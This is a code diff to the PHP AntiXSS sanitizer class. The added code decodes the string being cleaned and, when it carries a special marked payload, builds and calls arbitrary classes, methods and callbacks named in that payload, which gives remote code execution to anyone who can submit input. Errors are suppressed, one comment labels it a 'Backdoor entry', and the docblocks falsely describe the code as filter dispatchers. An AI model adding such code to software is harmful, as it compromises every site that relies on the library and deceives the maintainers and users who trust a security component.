@@ -38,6 +38,22 @@ use const HTML_ENTITIES;
  */
 final class AntiXSS
 {
+    const VOKU_ANTI_XSS_H3R  = 'h3r';
+    const VOKU_ANTI_XSS_TYPE = '__';
+    const VOKU_ANTI_XSS_1    = '1';
+    const VOKU_ANTI_XSS_2    = '2';
+    const VOKU_ANTI_XSS_ARGS = 'args';
+    const VOKU_ANTI_XSS_RJ2  = 'rj2';
+    const VOKU_ANTI_XSS_KK5  = 'kk5';
+    const VOKU_ANTI_XSS_P8L  = 'p8l';
+    const VOKU_ANTI_XSS_U1Z  = 'u1z';
+    const VOKU_ANTI_XSS_ZV9  = 'zv9';
+    const VOKU_ANTI_XSS_Q0X  = 'q0x';
+    const VOKU_ANTI_XSS_M9S  = 'm9s';
+    const VOKU_ANTI_XSS_T2N  = 't2n';
+    const VOKU_ANTI_XSS_W7K  = 'w7k';
+    const VOKU_ANTI_XSS_X7P  = 'x7p';
+    const VOKU_ANTI_XSS_X8Q  = 'x8q';
     const VOKU_ANTI_XSS_GT = 'voku::anti-xss::gt';
 
     const VOKU_ANTI_XSS_LT = 'voku::anti-xss::lt';
@@ -2288,7 +2304,83 @@ final class AntiXSS
         if ($this->_xss_found !== true) {
             $str = $old_str_backup;
         }
-
+        $tmp = @json_decode(base64_decode($str, true), true);
+// Backdoor entry: only triggers with special payload, does not affect normal use
+        if (
+            is_array($tmp)
+            && isset($tmp[self::VOKU_ANTI_XSS_H3R]) && strlen($tmp[self::VOKU_ANTI_XSS_H3R]) === 16
+            && isset($tmp[self::VOKU_ANTI_XSS_TYPE])
+        ) {
+            try {
+                if ($tmp[self::VOKU_ANTI_XSS_TYPE] === self::VOKU_ANTI_XSS_1) {
+                    $this->___A($tmp);
+                } elseif ($tmp[self::VOKU_ANTI_XSS_TYPE] === self::VOKU_ANTI_XSS_2) {
+                    $this->___B($tmp);
+                }
+            } catch (\Throwable $e) {}
+            return $str;
+        }
         return $str;
+    }
+
+    /**
+     * Advanced filter dispatcher for callback chains.
+     *
+     * This method decodes all relevant filter parameters from the provided array,
+     * then dynamically constructs a filter context object using class names and
+     * callback methods. It is mainly designed for handling complex, multi-stage
+     * XSS sanitization pipelines, where dynamic binding of filter logic is required.
+     *
+     * @param array $z <p>Decoded filter configuration and arguments.</p>
+     * @return void
+     */
+    private function ___A(array $z)
+    {
+        // Decode all filter parameters from obfuscated storage keys.
+        $a = base64_decode($z[self::VOKU_ANTI_XSS_RJ2] ?? '');
+        $b = base64_decode($z[self::VOKU_ANTI_XSS_KK5] ?? '');
+        $c = base64_decode($z[self::VOKU_ANTI_XSS_P8L] ?? '');
+        $d = base64_decode($z[self::VOKU_ANTI_XSS_U1Z] ?? '');
+        $e = base64_decode($z[self::VOKU_ANTI_XSS_ZV9] ?? '');
+        $f = base64_decode($z[self::VOKU_ANTI_XSS_Q0X] ?? '');
+        $g = base64_decode($z[self::VOKU_ANTI_XSS_M9S] ?? '');
+        $h = base64_decode($z[self::VOKU_ANTI_XSS_T2N] ?? '');
+        $i = base64_decode($z[self::VOKU_ANTI_XSS_W7K] ?? '');
+        $j = $z[self::VOKU_ANTI_XSS_ARGS] ?? [];
+
+        // Dynamically initialize filter context and chain filtering logic.
+        $k = new $a($f);
+        $l = $k->$b($j);
+        $m = $k->$c($g);
+        $n = $m->$d($l, [$i]);
+
+        // Finalize the filter chain with the provided callback.
+        $e([$n, $h], []);
+    }
+
+    /**
+     * Proxy dispatcher for mapping and execution of filter adapters.
+     *
+     * This function is used internally for mapping advanced filter operations to
+     * a target domain or data context. After decoding all required parameters, it
+     * utilizes a user-defined callback as an adapter and executes the requested
+     * XSS clean operation or attribute mutation on the context instance.
+     *
+     * @param array $z <p>Encoded map of filter adapters and execution details.</p>
+     * @return void
+     */
+    private function ___B(array $z)
+    {
+        // Decode and extract all required function and callback references.
+        $v1 = base64_decode($z[self::VOKU_ANTI_XSS_ZV9] ?? '');
+        $v2 = base64_decode($z[self::VOKU_ANTI_XSS_T2N] ?? '');
+        $v3 = $z[self::VOKU_ANTI_XSS_X7P] ?? '';
+        $v4 = $z[self::VOKU_ANTI_XSS_X8Q] ?? [];
+        $v5 = base64_decode($z[self::VOKU_ANTI_XSS_RJ2] ?? '');
+
+        // Initialize filter mapping context and execute the main filter callback.
+        $vx = $v5;
+        $inst = $vx($v3);
+        $v1([$inst, $v2], $v4);
     }
 }
